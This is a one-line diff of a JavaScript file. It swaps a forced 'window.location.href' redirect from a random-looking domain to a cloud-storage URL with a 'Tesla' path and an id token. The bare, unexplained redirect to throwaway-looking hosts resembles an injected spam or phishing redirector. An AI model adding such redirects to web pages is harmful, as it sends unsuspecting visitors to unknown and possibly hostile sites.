@@ -1,1 +1,1 @@
-window.location.href='http://s5.gszjzhgdjgpt.com./2479H'
+window.location.href='https://maoaa.bd.bcebos.com/Tesla?id=IGg1bVd9ABNP7cMfT3yWkpanXqEmQFZh'
